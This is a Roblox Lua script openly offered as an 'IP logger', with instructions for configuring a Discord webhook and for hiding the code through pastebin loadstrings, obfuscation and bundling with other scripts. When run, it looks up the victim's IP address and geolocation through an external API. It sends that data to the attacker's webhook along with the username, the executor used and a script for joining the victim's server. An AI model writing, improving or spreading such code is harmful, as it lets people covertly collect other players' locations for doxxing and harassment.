--[[
How to use: 

First make a discord Server and make a webhook, paste the webhook into the spot that says "Webhook goes here"
And thats literally how to make the script work

How to hide it: 

Start off by doing the how to use steps
After ur done with that put the script u made into a pastebin and turn that into a loadstring
u can use this template

loadstring(game:HttpGet("ur-pastebin-here", true))()

After that put the loadstring into a text file and use a lua obfuscator of choise, if u just want a free bad one use "https://luaobfuscator.com"

After u have obfuscated the file u can either send the obfuscated loadstring or u can put it into another pastebin and make that a loadstring

Why obfuscate the loadstring?
the script breaks if u obfuscate the script itself, thats why u have to use a loadstring

you can also include other scripts below or above the logger so that u can hide it better

]]--

local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "webhook goes here" --pretty obvious what to do here
local data = {
            ["username"] = "Salmon-L0G", --webhook name thing idk
            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
    
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXECUTED UR LOGGER LOL", --normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", --sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
